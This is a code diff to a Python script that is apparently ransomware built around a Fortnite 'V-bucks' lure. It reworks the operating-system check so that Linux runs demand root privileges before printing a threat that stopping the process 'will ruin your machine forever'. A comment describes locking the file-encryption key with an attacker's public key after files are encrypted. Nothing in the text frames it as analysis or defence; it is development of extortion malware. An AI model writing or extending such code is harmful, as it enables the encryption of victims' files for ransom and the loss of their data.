@@ -16,11 +16,12 @@ def OS_checker():
 
     if "Windows" in System_Info:
         print("V-bucks Trap Activated! Any attempt to stop this will ruin your machine forever...")
-    else:
-        pass
-    if "Linux" in System_Info:
-        sudo_checker()
-        print("V-bucks Trap Activated! Any attempt to stop this will ruin your machine forever...")
+    elif "Linux" in System_Info:
+        if os.geteuid() != 0:
+            print("Please run this with sudo in order for the process to work!")
+            sys.exit(1)
+        else:
+            print("V-bucks Trap Activated! Any attempt to stop this will ruin your machine forever...")
     else:
         pass
     
@@ -28,13 +29,6 @@ def OS_checker():
 
         #print("This is what the systemRoot variable is referring to: -> " + systemRoot)
         #print("This is what the System_Info variable above contains as a result of the platform.platform() command: -> " + System_Info) 
-
-# This function will check if the program is being run as sudo..(Utilized on Linux Machines)
-def sudo_checker():
-
-    if os.geteuid() != 0: 
-        print("Please run this with sudo in order for the process to work!")
-        sys.exit(1)
      
 # Asymmetric public key used to lock the fernet key after files have been encrypted
 public_key_pem = """
